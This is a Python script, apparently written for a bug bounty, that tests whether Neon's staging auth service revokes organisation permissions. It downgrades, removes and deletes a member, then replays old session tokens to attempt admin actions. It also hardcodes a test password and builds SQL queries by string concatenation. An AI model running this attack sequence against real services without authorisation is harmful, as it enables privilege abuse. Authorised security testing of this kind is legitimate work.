# -*- coding: utf-8 -*-
"""V3: org plugin permission-revocation timeliness attack.
Hypothesis: role downgrade / member removal / org deletion may not invalidate
existing sessions - old session token keeps admin powers (stale-permission bug).
W4 tested static role->op matrix only; this tests state-change -> old session."""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
DB_URI = None
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, timeout=30):
    try:
        ctx = ssl.create_default_context()
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        payload = json.dumps(body) if body is not None else None
        hdrs = {"Content-Type": "application/json", "Origin": "http://localhost:3000",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if cookie:
            hdrs["Cookie"] = cookie
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.7)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.7)
        return None, str(e)[:150], ""


def auth(email):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": PASS})
    return ck.split(";")[0] if st in (200, 201) else None


def fetch_db_uri():
    global DB_URI
    try:
        ctx = ssl.create_default_context()
        conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
        conn.request("GET", API_BASE + "/projects/%s/connection_uri?database_name=neondb"
                     "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN),
                     headers={"X-Bug-Bounty": "xxbo",
                              "Authorization": "Bearer " + APIKEY})
        resp = conn.getresponse()
        data = json.loads(resp.read().decode("utf-8", "replace"))
        conn.close()
        uri = data.get("uri")
        from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
        parts = urlsplit(uri)
        q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
        DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path,
                             urlencode(q), parts.fragment))
        return True
    except Exception as e:
        out("fetch uri err: %s" % str(e)[:120])
        return False


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        with conn.cursor() as cur:
            cur.execute(sql)
            return cur.fetchall()


def uid(email):
    r = dbq('SELECT id FROM neon_auth.user WHERE email=%s' % ("'" + email + "'"))
    return str(r[0][0]) if r else None


def mid(org, email):
    u = uid(email)
    if not u:
        return None
    r = dbq('SELECT id FROM neon_auth.member WHERE "organizationId"=%s AND "userId"=%s'
            % ("'" + org + "'", "'" + u + "'"))
    return str(r[0][0]) if r else None


def org_members(org):
    r = dbq('SELECT m.role, u.email FROM neon_auth.member m JOIN neon_auth.user u '
            'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))
    return r


def call(tag, method, path, body, cookie):
    st, data, _ = na(method, path, body, cookie)
    out("%-52s -> %s %s" % (tag, st, data[:180]))
    return st, data


def main():
    out("== V3 permission-revocation timeliness ==")
    if not fetch_db_uri():
        return
    c1 = auth(U1)
    c2 = auth(U2)
    if not (c1 and c2):
        out("ABORT session fail")
        return

    # fresh org owned by U1
    st, data, _ = na("POST", "/neondb/auth/organization/create",
                     {"name": "v3-org", "slug": "v3-%d" % int(time.time())}, c1)
    org = json.loads(data).get("id") if st == 200 else None
    out("V3 org = %s" % org)
    if not org:
        return

    # U2 joins as admin
    st, data, _ = na("POST", "/neondb/auth/organization/invite-member",
                     {"organizationId": org, "email": U2, "role": "admin"}, c1)
    inv_id = None
    try:
        inv_id = json.loads(data).get("id")
    except Exception:
        pass
    if not inv_id:
        r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s '
                'AND email=%s AND status=%s' % ("'" + org + "'", "'" + U2 + "'", "'pending'"))
        inv_id = str(r[0][0]) if r else None
    st, data, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                     {"invitationId": inv_id}, c2)
    out("U2 join: %s members=%s" % (st, org_members(org)))
    m2 = mid(org, U2)
    out("m2=%s" % m2)

    # === A. baseline: U2 admin can invite ===
    call("A0 U2 admin invite U4", "POST", "/neondb/auth/organization/invite-member",
         {"organizationId": org, "email": "libobo1229+na_v3x@gmail.com", "role": "member"}, c2)

    # === B. downgrade U2 -> member, replay SAME U2 session ===
    call("B0 owner downgrades U2 to member", "POST",
         "/neondb/auth/organization/update-member-role",
         {"organizationId": org, "memberId": m2, "role": "member"}, c1)
    out("   members now: %s" % org_members(org))
    call("B1 U2 OLD session tries invite (downgraded)", "POST",
         "/neondb/auth/organization/invite-member",
         {"organizationId": org, "email": "libobo1229+na_v3y@gmail.com", "role": "member"}, c2)
    call("B2 U2 OLD session tries update-member-role", "POST",
         "/neondb/auth/organization/update-member-role",
         {"organizationId": org, "memberId": m2, "role": "admin"}, c2)
    out("   members after B: %s" % org_members(org))

    # === C. remove U2 entirely, replay OLD session ===
    call("C0 owner removes U2", "POST", "/neondb/auth/organization/remove-member",
         {"organizationId": org, "memberIdOrEmail": U2}, c1)
    out("   members now: %s" % org_members(org))
    call("C1 U2 OLD session list active orgs", "GET", "/neondb/auth/organization/list", None, c2)
    call("C2 U2 OLD session invite again", "POST", "/neondb/auth/organization/invite-member",
         {"organizationId": org, "email": "libobo1229+na_v3z@gmail.com", "role": "member"}, c2)
    call("C3 U2 OLD session update role", "POST",
         "/neondb/auth/organization/update-member-role",
         {"organizationId": org, "memberId": m2, "role": "admin"}, c2)

    # === D. delete whole org, replay owner session + removed-member session ===
    call("D0 owner deletes org", "POST", "/neondb/auth/organization/delete",
         {"organizationId": org}, c1)
    out("   org rows left: %s" % dbq('SELECT count(*) FROM neon_auth.organization WHERE id=%s'
                                     % ("'" + org + "'")))
    call("D1 owner OLD session list orgs", "GET", "/neondb/auth/organization/list", None, c1)
    call("D2 removed U2 OLD session list orgs", "GET", "/neondb/auth/organization/list", None, c2)

    # cleanup leftover pending invitations
    r = dbq('DELETE FROM neon_auth.invitation WHERE "organizationId"=%s RETURNING id' % ("'" + org + "'"))
    out("cleanup invitations: %s" % (len(r) if r else 0))


if __name__ == "__main__":
    main()
